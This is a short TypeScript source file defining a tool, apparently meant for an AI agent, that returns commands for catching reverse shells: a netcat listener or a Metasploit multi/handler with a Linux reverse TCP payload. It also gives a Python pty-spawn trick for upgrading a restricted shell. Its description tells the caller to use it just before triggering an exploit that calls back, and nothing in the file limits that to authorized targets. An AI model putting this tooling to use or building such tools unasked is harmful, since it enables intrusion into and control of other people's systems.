import { z } from 'zod';

export const ReverseShellListenerTool = {
  name: 'ReverseShellListener',
  description: 'Generates the command to set up a local listener for reverse shells. Use this when you are about to trigger an exploit that calls back to your IP.',
  inputSchema: z.object({
    port: z.number().describe('The port to listen on (e.g., 4444).'),
    type: z.enum(['nc', 'msfconsole']).default('nc'),
  }),

  async call(input: { port: number, type: string }) {
    if (input.type === 'nc') {
      const cmd = `nc -lvnp ${input.port}`;
      return `To catch the shell, execute this in a separate terminal or background it:\n\n${cmd}\n\nHeuristic: If you are in a restricted shell, try: python -c 'import pty; pty.spawn("/bin/bash")' after connection.`;
    } else {
      const msfCmd = `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${input.port}; run"`;
      return `Metasploit Handler Command:\n\n${msfCmd}`;
    }
  }
};